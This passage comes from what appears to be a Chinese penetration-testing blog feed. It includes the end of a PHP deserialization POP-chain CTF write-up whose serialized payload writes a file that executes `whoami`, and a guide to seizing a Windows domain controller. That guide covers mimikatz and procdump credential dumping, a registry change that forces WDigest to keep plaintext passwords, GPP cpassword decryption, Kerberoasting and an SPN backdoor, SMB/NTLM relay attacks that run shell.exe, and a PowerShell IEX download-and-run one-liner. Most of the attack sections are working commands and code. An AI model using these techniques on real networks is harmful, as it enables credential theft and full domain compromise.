punctuation">.</span> <span class="token string">"'>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/a>&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">name_is</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>继续找，当实例化对象Lyricsde时，log方法存在$this-&gt;logwriter-&gt;writeLog，而writeLog又存在于LogWriter_File类中，这好这个类是我们的漏洞触发点，所以$this-&gt;logwriter应该为new LogWriter_Fil()，构造下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Logger</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logwriter</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LogWriter_File</span><span class="token punctuation">(</span><span class="token string">'123.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>实例化对象Logger之后，调用了LogWriter_File的writeLog方法，而写入文件的txt是通过$this-&gt;format-&gt;format获得，而format方法存在类LogFileFormat中，所以，构造如下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">LogWriter_File</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LogFileFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 111</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//TODO: Modify the address here, and delete this TODO.</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"D:\\phpStudy\\WWW\\ctf"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>在类LogFileFormat中的format方法中利用$filter-&gt;filter来获取的$txt，而$filter是通过foreach获取的，所以$this-&gt;filters为一个数组，最终OutputFilter传入写入文件的内容，就可以构造如下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">OutputFilter</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$matchPattern</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$replacement</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span> <span class="token operator">=</span> '<span class="token comment" spellcheck="true">//';</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span> <span class="token operator">=</span> <span class="token string">'&lt;?= `whoami`?>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogFileFormat</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OutputFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 111</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$filter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>最后，将payload组合起来，利用serialize输出下序列化的结果</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/4.png" alt="4" loading="lazy"></p><pre><code>O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A3%3A%22111%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A7%3A%22123.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A14%3A%22%3C%3F%3D+%60whoami%60%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D</code></pre><p>在base64下通过cookie传入就可以写入ctf123.php了</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/5.png" alt="5" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/</a></p><p>2.<a href="https://xz.aliyun.com/t/3674#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-9</a></p><p>3.<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80" target="_blank" rel="noopener">https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;序列化与反序列化&quot;&gt;&lt;a href=&quot;#序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化&quot;&gt;&lt;/a&gt;&lt;strong&gt;序列化与反序列化&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在php中，使用serialize和unserialize
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>获取域控的方法</title>
    <link href="http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2020-02-26T10:35:58.000Z</published>
    <updated>2020-02-26T10:48:00.083Z</updated>
    
    <content type="html"><![CDATA[<h4 id="高权限读取本地密码"><a href="#高权限读取本地密码" class="headerlink" title="高权限读取本地密码"></a><strong>高权限读取本地密码</strong></h4><p>当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的lsass.exe，可以通过mimikatz来读取到本地的明文密码。</p><pre><code>privilege::debug  # 提权sekurlsa::logonpasswords</code></pre><p>如果主机存在杀软的时候，上传mimikatz很多时候都会被杀掉，可以通过<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">procdump</a>+mimikatz的方式进行绕过。先导出lsass.exe</p><pre><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p>保存到本地，通过mimikatz读lsass.dmp的明文</p><pre><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;  &gt; 1.txt</code></pre><p>如果目标机器是windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录及可以读取明文。</p><p>添加注册表，设置UseLogonCredential设置为1</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p>利用powershell脚本进行锁屏</p><pre><code>Function Lock-WorkStation {$signature = @&quot;[DllImport(&quot;user32.dll&quot;, SetLastError = true)]public static extern bool LockWorkStation();&quot;@$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru$LockWorkStation::LockWorkStation() | Out-Null}Lock-WorkStation</code></pre><p>管理员重新登录后就可以抓取到明文密码了。</p><h4 id="SYSVOL还原组策略"><a href="#SYSVOL还原组策略" class="headerlink" title="SYSVOL还原组策略"></a><strong>SYSVOL还原组策略</strong></h4><p>在域环境中，有个默认的共享路径</p><pre><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></pre><p>SYSVOL是活动目录存储文件服务副本的共享文件夹，里面包含有登录脚本，组策略数据等，域里的所有用户都能访问这个共享文件。在SYSVOL目录下，默认是没有groups.xml文件的，必须创建组策略脚本登录才有这个文件。在groups.xml文件中，密码是通过AES-256加密的，但是微软发布了AES的<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" rel="noopener">私钥</a>。</p><p>可以利用powershell解密密文:</p><pre class=" language-powershell"><code class="language-powershell"><span class="token keyword">function</span> Get<span class="token operator">-</span>DecryptedCpassword <span class="token punctuation">{</span>    <span class="token namespace">[CmdletBinding()]</span>    <span class="token keyword">Param</span> <span class="token punctuation">(</span>        <span class="token namespace">[string]</span> <span class="token variable">$Cpassword</span>    <span class="token punctuation">)</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">#Append appropriate padding based on string length  </span>        <span class="token variable">$Mod</span> = <span class="token punctuation">(</span><span class="token variable">$Cpassword</span><span class="token punctuation">.</span>length <span class="token operator">%</span> 4<span class="token punctuation">)</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$Mod</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token string">'1'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> = <span class="token variable">$Cpassword</span><span class="token punctuation">.</span>Substring<span class="token punctuation">(</span>0<span class="token punctuation">,</span><span class="token variable">$Cpassword</span><span class="token punctuation">.</span>Length <span class="token operator">-</span>1<span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token string">'2'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span>4 <span class="token operator">-</span> <span class="token variable">$Mod</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token string">'3'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span>4 <span class="token operator">-</span> <span class="token variable">$Mod</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$Base64Decoded</span> = <span class="token namespace">[Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$Cpassword</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#Create a new AES .NET Crypto Object</span>        <span class="token variable">$AesObject</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Security<span class="token punctuation">.</span>Cryptography<span class="token punctuation">.</span>AesCryptoServiceProvider        <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span> <span class="token variable">$AesKey</span> = @<span class="token punctuation">(</span>0x4e<span class="token punctuation">,</span>0x99<span class="token punctuation">,</span>0x06<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>0xfc<span class="token punctuation">,</span>0xb6<span class="token punctuation">,</span>0x6c<span class="token punctuation">,</span>0xc9<span class="token punctuation">,</span>0xfa<span class="token punctuation">,</span>0xf4<span class="token punctuation">,</span>0x93<span class="token punctuation">,</span>0x10<span class="token punctuation">,</span>0x62<span class="token punctuation">,</span>0x0f<span class="token punctuation">,</span>0xfe<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>                             0xf4<span class="token punctuation">,</span>0x96<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>0x06<span class="token punctuation">,</span>0xcc<span class="token punctuation">,</span>0x05<span class="token punctuation">,</span>0x79<span class="token punctuation">,</span>0x90<span class="token punctuation">,</span>0x20<span class="token punctuation">,</span>0x9b<span class="token punctuation">,</span>0x09<span class="token punctuation">,</span>0xa4<span class="token punctuation">,</span>0x33<span class="token punctuation">,</span>0xb6<span class="token punctuation">,</span>0x6c<span class="token punctuation">,</span>0x1b<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#Set IV to all nulls to prevent dynamic generation of IV value</span>        <span class="token variable">$AesIV</span> = <span class="token function">New-Object</span> Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$AesObject</span><span class="token punctuation">.</span>IV<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>         <span class="token variable">$AesObject</span><span class="token punctuation">.</span>IV = <span class="token variable">$AesIV</span>        <span class="token variable">$AesObject</span><span class="token punctuation">.</span>Key = <span class="token variable">$AesKey</span>        <span class="token variable">$DecryptorObject</span> = <span class="token variable">$AesObject</span><span class="token punctuation">.</span>CreateDecryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span> <span class="token variable">$OutBlock</span> = <span class="token variable">$DecryptorObject</span><span class="token punctuation">.</span>TransformFinalBlock<span class="token punctuation">(</span><span class="token variable">$Base64Decoded</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$Base64Decoded</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token namespace">[System.Text.UnicodeEncoding]</span>::Unicode<span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$OutBlock</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">catch</span> <span class="token punctuation">{</span><span class="token function">Write-Error</span> <span class="token variable">$Error</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>Get<span class="token operator">-</span>DecryptedCpassword <span class="token string">"I0vK3Yj0SeoHQDxF5skcjt3BOkMZmX6IiqRVKCTo4Z4"</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/1.png" alt="" loading="lazy"></p><p>针对SYSOVL的防御：</p><pre><code>1.打补丁KB29624862.删除SYSVOL目录下的groups.xml3.设置共享文件SYSVOL的权限</code></pre><h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a><strong>Kerberoasting</strong></h4><p>SPN为服务主体名称，是服务实列(MSSQL,HTTP等)的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的SPN，如果kerberos服务票证的加密类型为RC4_HMAC_MD5，就可以导出TGS对其进行离线破解，获取到域用户的密码了。</p><p>使用setspn查询spn(windows7和server2008默认自带)</p><p>查询域内所有的SPN和查询test域的SPN</p><pre><code>setspn.exe -q */*setspn.exe -T test.com -q */*</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/2.png" alt="" loading="lazy"></p><p>以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users</p><p>查询域内注册的spn（kerberoast）</p><pre><code>cscript GetUserSPNs.vbs</code></pre><p>PowerView</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><pre><code>Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</code></pre><p>给MSSQL服务注册SPN</p><pre><code>setspn.exe -A MSSQLSvc/WIN-M34UCFJIPNQ.test.com test.com\fanxing</code></pre><p>将kerberos的加密方式换成RC4_HMAC_MD5</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/3.png" alt="" loading="lazy"></p><p>请求指定的TGS，完成之后klist就能查看相应的票据</p><pre><code>$SPNName = &#39;MSSQLSvc/WIN-M34UCFJIPNQ.test.com&#39;Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/4.png" alt="" loading="lazy"></p><p>mimikatz导出票据</p><pre><code>kerberos::list /export</code></pre><p>使用<a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">tgsrepcrack.py</a>破解</p><pre><code>python tgsrepcrack.py wordlist.txt mssql.kirbi</code></pre><p><strong>kerberoasting后门利用</strong></p><p>在获取到spn的修改权限后，可以给指定的域用户注册spn，可以获取到任意域用户的TGS进行离线破解</p><pre><code>setspn.exe -U -A VNC/WIN-M34UCFJIPNQ.test.com Administrator</code></pre><h4 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a><strong>重放攻击</strong></h4><p>在NTML认证的过程中，数据包传递的是NTML-Hash加密的16位的challenge随机数得到的Net-NTML</p><p> Hash，如果存在中间人的情况，就可以通过hash进行重放攻击，下面简述下存在中间人，NTML协议过程：</p><p><img src="https://p1.ssl.qhimg.com/t01f22f78b71df16680.png" alt="" loading="lazy"></p><pre><code>1.当客户端对服务端发起请求，客户端并不知道中间人存在，所以把请求发送给了中间人。中间人拿着这个请求发送给服务端，服务端以为是客户端发来的请求。2.进过验证后，会生成一个随机数(challenge)返回给攻击者，服务端保存的ntmlhash进行DES加密challenge(challenge1)，攻击者拿着这个challenge明文发送给客户端。3.客户端对这个challenge用自己的密码进行DES加密(response)，发送给中间人，中间人在将这个请求发送给服务端。4.服务端拿到这个response跟之前加密的challenge1进行对比，一样的话就验证成功。</code></pre><p>在进行ntml中间人攻击的时候，要避免最小的网络流量，所以使用的比较多的也是LLMNR/NetNS欺骗。</p><p>在两台windows进行进行资源请求的时候，对机器的解析顺序为：</p><pre><code>1.HOSTS文件(c:/windows/system32/driver/etc/hosts)2.本地的DNS缓存(ipconfig /displaydns)3.dns服务器4.LLMNR5.NetBios-NS</code></pre><h5 id="SMB中继"><a href="#SMB中继" class="headerlink" title="SMB中继"></a>SMB中继</h5><p>对于smb中继的利用条件：</p><pre><code>1.不能开启smb签名，而在域内，域控上面是开启了签名的，域成员机器是没有开启的。2.打了ms08-068补丁的xp/2003系统也无法利用</code></pre><p>首先利用nmap探测是否开启了签名</p><pre><code>nmap -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.50.241</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/5.png" alt="" loading="lazy"></p><h5 id="Responder-ntmlrelayx"><a href="#Responder-ntmlrelayx" class="headerlink" title="Responder+ntmlrelayx"></a>Responder+ntmlrelayx</h5><p>获取ntmlv2 hash，在攻击机执行</p><pre><code>python Responder.py -I eth0 -v      #假设ip为192.168.50.64</code></pre><p>在任意机器上执行</p><pre><code>dir \\192.168.50.64\c$</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/6.png" alt="" loading="lazy"></p><p>当使用ntmlrelayx进行重放攻击的时候，需要在Responder.conf设置SMB和HTTP服务为Off</p><pre><code>python Responder.py -I eth0 -v    # 启动Responder，假设ip为192.168.50.64python ntlmrelayx.py -t 192.168.50.241   # -t为受害者，进行中继攻击net use192.168.50.64\c$ &quot;fx@123.com&quot; /user:&quot;administrator&quot;   # 攻击机执行</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/7.png" alt="" loading="lazy"></p><h5 id="smbrelayx"><a href="#smbrelayx" class="headerlink" title="smbrelayx"></a>smbrelayx</h5><p>使用smbrelayx和ntmlrelayx都是利用的<a href="https://github.com/CoreSecurity/impacket.git" target="_blank" rel="noopener">impacket</a>，环境配置</p><pre><code>pip install pycrypto    # 安装加密库apt-get --reinstall install python-pyasn1 python-pyasn1-modulescd impacket/python setup.py install</code></pre><p>在攻击机进行重放攻击</p><pre><code># -h为指定受害者，-e在进行重放攻击后，在受害者机器执行exepython smbrelayx.py -h 192.168.50.241 -e /root/shell.exe </code></pre><p>在内网其他目标机器执行</p><pre><code>net use192.168.50.64\c$ &quot;fx@123.com&quot; /user:&quot;administrator&quot;</code></pre><p>在msf上成功获取到meterpreter</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/8.png" alt="" loading="lazy"></p><h5 id="Windows平台的重放攻击"><a href="#Windows平台的重放攻击" class="headerlink" title="Windows平台的重放攻击"></a>Windows平台的重放攻击</h5><p>在windows下，可以利用powershell编写的<a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">Inveigh</a>工具</p><pre><code>powershell &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1&#39;);Invoke-Inveigh -consoleoutput Y FileOutput Y&quot;</code></pre><p>在其他主机上执行</p><pre><code>dir \\192.168.50.242\c$   或者在开启HTTP，利用&lt;img&gt;来加载图片&lt;img src=&quot;\\192.168.50.242\1.png&quot;&gt;    在通过HTTP协议访问就行了</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/9.png" alt="" loading="lazy"></p><p>注意：在获取权限的那台机器，需要关闭windows防火墙，不是一直获取到challenge。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;高权限读取本地密码&quot;&gt;&lt;a href=&quot;#高权限读取本地密码&quot; class=&quot;headerlink&quot; title=&quot;高权限读取本地密码&quot;&gt;&lt;/a&gt;&lt;strong&gt;高权限读取本地密码&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;当域管理员在域成员机器上登录进行工作的时候，会将明
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP3.2.3 漏洞分析</title>
    <link href="http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-02-23T16:00:00.000Z</published>
    <updated>2020-04-29T05:17:44.842Z</updated>
    
    <content type="html"><![CDATA[<h4 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a><strong>where注入</strong></h4><p>在控制器中，写个demo，利用字符串方式作为where传参时存在注入</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string">'id='</span><span class="token punctuation">.</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在变量user地方进行断点，PHPSTROM 